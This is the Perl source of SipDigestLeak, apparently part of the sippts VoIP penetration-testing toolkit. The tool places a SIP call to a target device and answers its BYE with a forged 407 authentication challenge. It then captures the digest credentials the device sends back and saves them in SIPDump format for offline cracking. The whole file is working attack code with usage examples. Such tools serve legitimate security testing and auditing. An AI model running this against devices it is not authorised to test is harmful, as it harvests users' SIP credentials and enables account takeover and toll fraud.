#!/usr/bin/perl
# -=-=-=-=-=-=-
# SipDigestLeak
# -=-=-=-=-=-=-
#
# Copyright (C) 2015-2019 Jose Luis Verdeguer <pepeluxx@gmail.com>
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

use warnings;
use strict;
use IO::Socket;
use IO::Socket::Timeout;
use NetAddr::IP;
use Getopt::Long;
use Digest::MD5 qw(md5 md5_hex md5_base64);
use Net::Address::IP::Local;

my $ipaddr    = Net::Address::IP::Local->public;
my $useragent = 'pplsip';

my $host       = '';        # host
my $lport      = '5070';    # local port
my $dport      = '5060';    # destination port
my $fromuser   = '100';     # From User
my $fromname   = '';        # From Name
my $touser     = '100';     # To User
my $v          = 0;         # verbose mode
my $from_ip    = '';
my $totag      = "";
my $cseq       = "1";
my $bye_branch = "";
my $sd         = "";
my $ver        = 0;

sub init() {

  # check params
  my $result = GetOptions(
    "h=s"      => \$host,
    "fu=s"     => \$fromuser,
    "fn=s"     => \$fromname,
    "tu=s"     => \$touser,
    "l=s"      => \$lport,
    "r=s"      => \$dport,
    "ua=s"     => \$useragent,
    "sd=s"     => \$sd,
    "version+" => \$ver,
    "v+"       => \$v
  );

  check_version() if ( $ver eq 1 );
  help()          if ( $host eq "" );

  $from_ip = $ipaddr if ( $from_ip eq "" );

  my $callid = &generate_random_string( 32, 1 );
  my $sc     = new IO::Socket::INET->new( PeerPort => $dport, LocalPort => $lport, Proto => 'udp', PeerAddr => $host, Timeout => 10 );

  if ($sc) {
    IO::Socket::Timeout->enable_timeouts_on($sc);
    $sc->read_timeout(60);
    $sc->enable_timeout;
    $lport = $sc->sockport() if ( $lport eq "" );

    # send INVITE
    if ( $v eq 0 ) { print "[+] Connecting to $host:$dport\n"; }
    my $res = send_invite( $sc, $from_ip, $host, $lport, $dport, $fromuser, $fromname, $touser, $callid );

    # Call is attended. Wait the hung up
    if ( $res =~ /^200/ ) {
      send_ack( $sc, $from_ip, $host, $lport, $dport, $fromuser, $touser, $callid );
      wait_bye($sc);
      send_error( $sc, $from_ip, $host, $lport, $dport, $fromuser, $touser, $callid, $cseq );
    }
  }

  exit;
}

# Send INVITE message
sub send_invite {
  my $sc       = shift;
  my $from_ip  = shift;
  my $host     = shift;
  my $lport    = shift;
  my $dport    = shift;
  my $from     = shift;
  my $fromname = shift;
  my $to       = shift;
  my $callid   = shift;

  my $branch = &generate_random_string( 71, 0 );

  my $msg = "INVITE sip:" . $to . "@" . $host . ":" . $dport . " SIP/2.0\r\n";
  $msg .= "Via: SIP/2.0/UDP $from_ip:$lport;branch=$branch\r\n";
  $msg .= "From: $fromname <sip:" . $from . "@" . $host . ">;tag=0c26cd11\r\n";
  $msg .= "To: <sip:" . $to . "@" . $host . ">\r\n";
  $msg .= "Contact: <sip:" . $from . "@" . $from_ip . ":$lport;transport=udp>\r\n";
  $msg .= "Call-ID: " . $callid . "\r\n";
  $msg .= "CSeq: 1 INVITE\r\n";
  $msg .= "User-Agent: $useragent\r\n";
  $msg .= "Max-Forwards: 70\r\n";
  $msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
  $msg .= "Content-Length: 0\r\n\r\n";

  print $sc $msg;

  if   ( $v eq 0 ) { print "[+] Sending INVITE $fromuser => $touser\n"; }
  else             { print "Sending:\n=======\n$msg"; }

  my $data     = "";
  my $response = "";
  my $line     = "";

LOOP: {
    while (<$sc>) {
      $line = $_;

      if ( $line =~ /^SIP\/2.0/ ) {
        $line =~ /^SIP\/2.0\s(.+)\r\n/;
        if ($1) { $response = $1; }
      }

      if ( $line =~ /^To/i && $line =~ /;tag/i ) {
        $line =~ /;tag=(.+)\r\n/;
        $totag = $1 if ($1);
      }

      $data .= $line;

      if ( $line =~ /^\r\n/ ) {
        if   ( $v eq 0 ) { print "[-] $response\n"; }
        else             { print "Receiving:\n=========\n$data"; }

        last LOOP if ( $response !~ /^1/ );

        $data     = "";
        $response = "";
      }
    }
  }

  return $response;
}

# Send ACK message
sub send_ack {
  my $sc      = shift;
  my $from_ip = shift;
  my $host    = shift;
  my $lport   = shift;
  my $dport   = shift;
  my $from    = shift;
  my $to      = shift;
  my $callid  = shift;

  my $branch = &generate_random_string( 71, 0 );

  my $msg = "ACK sip:" . $to . "@" . $host . ":" . $dport . " SIP/2.0\r\n";
  $msg .= "Via: SIP/2.0/UDP $from_ip:$lport;branch=$branch\r\n";
  $msg .= "From: <sip:" . $from . "@" . $host . ">;tag=0c26cd11\r\n";
  $msg .= "To: <sip:" . $to . "@" . $host . ">;tag=$totag\r\n";
  $msg .= "Call-ID: " . $callid . "\r\n";
  $msg .= "CSeq: 1 ACK\r\n";
  $msg .= "Contact: <sip:" . $from . "@" . $from_ip . ":$lport;transport=udp>\r\n";
  $msg .= "User-Agent: $useragent\r\n";
  $msg .= "Max-Forwards: 70\r\n";
  $msg .= "Allow: INVITE,ACK,CANCEL,BYE,NOTIFY,REFER,OPTIONS,INFO,SUBSCRIBE,UPDATE,PRACK,MESSAGE\r\n";
  $msg .= "Content-Length: 0\r\n\r\n";

  print $sc $msg;

  if   ( $v eq 0 ) { print "[+] Sending ACK\n"; }
  else             { print "Sending:\n=======\n$msg"; }
}

# Wait BYE
sub wait_bye {
  my $sc = shift;

  my $data     = "";
  my $response = "";
  my $line     = "";
  my $bye      = 0;
  my $auth     = "";
  my $resp     = "";
  my $user     = "";
  my $uri      = "";
  my $cnonce   = "";
  my $nc       = "";
  my $qop      = "";
  my $realm  = "asterisk";
  my $nonce  = &generate_random_string( 8, 0 );

  if ( $v eq 0 ) { print "[+] Waiting for the BYE message\n"; }

LOOP: {
    while (<$sc>) {
      $line = $_;

      if ( $line =~ /^SIP\/2.0/ || $line =~ /^BYE/i ) {
        $line =~ /^SIP\/2.0\s(.+)\r\n/;
        if ($1) { $response = $1; }
        $bye = 1 if ( $line =~ /^BYE/i );
      }

      if ( $line =~ /CSeq/i ) {
        $line =~ /CSeq\:\s(.+)\r\n/i;

        $cseq = $1 if ($1);
      }

      if ( $line =~ /^Via/i && $line =~ /;branch/i ) {
        $line =~ /;branch=(.+)\r\n/;
        $bye_branch = $1 if ($1);
      }

      # If is not the first try, maybe auth is received in the first BYE
      if ( $line =~ /Authorization/i ) {
        $line =~ /Authorization\:\s(.+)\r\n/i;
        $auth = $1 if ($1);

        $auth =~ /username\=\"([a-z|A-Z|0-9|-|_]+)\"/i;
        $user = $1 if ($1);

        $auth =~ /uri\=\"([a-z|A-Z|0-9|-|_|\.|\:|\;|\=|\@|\#]+)\"/i;
        $uri = $1 if ($1);

        $auth =~ /response\=\"(.+)\"/i;
        $resp = $1 if ($1);

        if ( $auth =~ /cnonce\=\"[\w\+\/]+\"/i ) {
          $auth =~ /cnonce\=\"([\w\+\/]+)\"/i;
          $cnonce = $1 if ($1);
        }
        else {
          $cnonce = "";
        }

        if ( $auth =~ /nc\=\"*[\w\+]+\"*/i ) {
          $auth =~ /nc\=\"*([\w\+]+)\"*/i;
          $nc = $1 if ($1);
        }
        else {
          $nc = "";
        }

        if ( $auth =~ /qop\=\"*[\w\+]+\"*/i ) {
          $auth =~ /qop\=\"*([\w\+]+)\"*/i;
          $qop = $1 if ($1);
        }
        else {
          $qop = "";
        }
      }

      $data .= $line;

      if ( $line =~ /^\r\n/ ) {
        if ( $auth ne "" && $sd ne "" ) {
          my $res = "$host\"$from_ip\"$user\"$realm\"BYE\"$uri\"$nonce\"$cnonce\"$nc\"$qop\"MD5\"$resp";
          open( my $fh, '>>', $sd ) or die "Could not open file '$sd' $!";
          print $fh "$res\n";
          close $fh;
          print "Data saved in file: $sd\n";
          exit;
        }

        if ( $bye eq 1 ) {
          if   ( $v eq 0 ) { print "[-] BYE received\n"; }
          else             { print "Receiving:\n=========\n$data"; }

          last LOOP;
        }

        $data     = "";
        $response = "";
      }
    }
  }
}

# Send 407 response error
sub send_error {
  my $sc      = shift;
  my $from_ip = shift;
  my $host    = shift;
  my $lport   = shift;
  my $dport   = shift;
  my $from    = shift;
  my $to      = shift;
  my $callid  = shift;
  my $csec    = shift;

  my $branch = $bye_branch;
  my $realm  = "asterisk";
  my $nonce  = &generate_random_string( 8, 0 );
  my $digest = "WWW-Authenticate: Digest algorithm=MD5, realm=\"$realm\", nonce=\"$nonce\"";

  my $msg = "SIP/2.0 407 Proxy Authentication Required\r\n";
  $msg .= "Via: SIP/2.0/UDP $host:$dport;branch=$branch\r\n";
  $msg .= "From: <sip:" . $to . "@" . $host . ":" . $dport . ">;tag=" . $totag . "\r\n";
  $msg .= "To: <sip:" . $from . "@" . $from_ip . ":" . $lport . ">;tag=0c26cd11\r\n";
  $msg .= "Call-ID: " . $callid . "\r\n";
  $msg .= "CSeq: $csec\r\n";
  $msg .= "$digest\r\n";
  $msg .= "Content-Length: 0\r\n\r\n";

  print $sc $msg;

  if   ( $v eq 0 ) { print "[+] Sending 407 Proxy Authentication Required\n"; }
  else             { print "Sending:\n=======\n$msg"; }

  my $data     = "";
  my $response = "";
  my $line     = "";
  my $auth     = "";
  my $resp     = "";
  my $user     = "";
  my $uri      = "";
  my $cnonce   = "";
  my $nc       = "";
  my $qop      = "";

LOOP: {
    while (<$sc>) {
      $line = $_;

      if ( $line =~ /^SIP\/2.0/ && ( $response eq "" || $response =~ /^1/ ) ) {
        $line =~ /^SIP\/2.0\s(.+)\r\n/;
        if ($1) { $response = $1; }
      }

      if ( $line =~ /Authorization/i ) {
        $line =~ /Authorization\:\s(.+)\r\n/i;
        $auth = $1 if ($1);

        $auth =~ /username\=\"([a-z|A-Z|0-9|-|_]+)\"/i;
        $user = $1 if ($1);

        $auth =~ /uri\=\"([a-z|A-Z|0-9|-|_|\.|\:|\;|\=|\@|\#]+)\"/i;
        $uri = $1 if ($1);

        $auth =~ /response\=\"(.+)\"/i;
        $resp = $1 if ($1);

        if ( $auth =~ /cnonce\=\"[\w\+\/]+\"/i ) {
          $auth =~ /cnonce\=\"([\w\+\/]+)\"/i;
          $cnonce = $1 if ($1);
        }
        else {
          $cnonce = "";
        }

        if ( $auth =~ /nc\=\"*[\w\+]+\"*/i ) {
          $auth =~ /nc\=\"*([\w\+]+)\"*/i;
          $nc = $1 if ($1);
        }
        else {
          $nc = "";
        }

        if ( $auth =~ /qop\=\"*[\w\+]+\"*/i ) {
          $auth =~ /qop\=\"*([\w\+]+)\"*/i;
          $qop = $1 if ($1);
        }
        else {
          $qop = "";
        }
      }

      $data .= $line;

      if ( $line =~ /^\r\n/ ) {
        if   ( $v eq 0 ) { print "[-] Auth: $auth\n"; }
        else             { print "Receiving:\n=========\n$data"; }

        if ( $auth ne "" && $sd ne "" ) {
          my $res = "$host\"$from_ip\"$user\"$realm\"BYE\"$uri\"$nonce\"$cnonce\"$nc\"$qop\"MD5\"$resp";
          open( my $fh, '>>', $sd ) or die "Could not open file '$sd' $!";
          print $fh "$res\n";
          close $fh;
          print "Data saved in file: $sd\n";
        }

        last LOOP if ( $response !~ /^1/ );

        $data     = "";
        $response = "";
      }
    }
  }

  return $response;
}

# Generate a random string
sub generate_random_string {
  my $length_of_randomstring = shift;
  my $only_hex               = shift;
  my @chars;

  if ( $only_hex == 0 ) {
    @chars = ( 'a' .. 'z', '0' .. '9' );
  }
  else {
    @chars = ( 'a' .. 'f', '0' .. '9' );
  }

  my $random_string;

  foreach ( 1 .. $length_of_randomstring ) {
    $random_string .= $chars[ rand @chars ];
  }

  return $random_string;
}

sub check_version {
  my $version     = '';
  my $versionfile = 'version';
  open( my $fh, '<:encoding(UTF-8)', $versionfile )
    or die "Could not open file '$versionfile' $!";

  while ( my $row = <$fh> ) {
    chomp $row;
    $version = $row;
  }

  my $v = `curl -s https://raw.githubusercontent.com/Pepelux/sippts/master/version`;
  $v =~ s/\n//g;

  if ( $v ne $version ) {
    print "The current version ($version) is outdated. There is a new version ($v). Please update:\n";
    print "https://github.com/Pepelux/sippts\n";
  }
  else {
    print "The current version ($version) is latest.\n";
  }

  exit;
}

sub help {
  print qq{
SipDigestLeak - by Pepelux <pepeluxx\@gmail.com>
-------------
Wiki: https://github.com/Pepelux/sippts/wiki/SIPDigestLeak

Usage: perl $0 -h <host> [options]
 
== Options ==
-fu  <string>    = From User (by default 100)
-fn  <string>    = From Name
-tu  <string>    = To User (by default 100)
-l  <integer>    = Local port (default: 5070)
-r  <integer>    = Remote port (default: 5060)
-ua <string>     = Customize the UserAgent
-sd <filename>   = Save data in a format SIPDump file
-v               = Verbose (trace information)
-version         = Show version and search for updates
 
== Examples ==
\$ perl $0 -h 192.168.0.1
\$ perl $0 -h 192.168.0.1 -r 5080 -v
\$ perl $0 -h 192.168.0.1 -sd data.txt
\$ perl $0 -h 192.168.0.1 -fu 666666666 -fn Devil
 
};

  exit 1;
}

init();
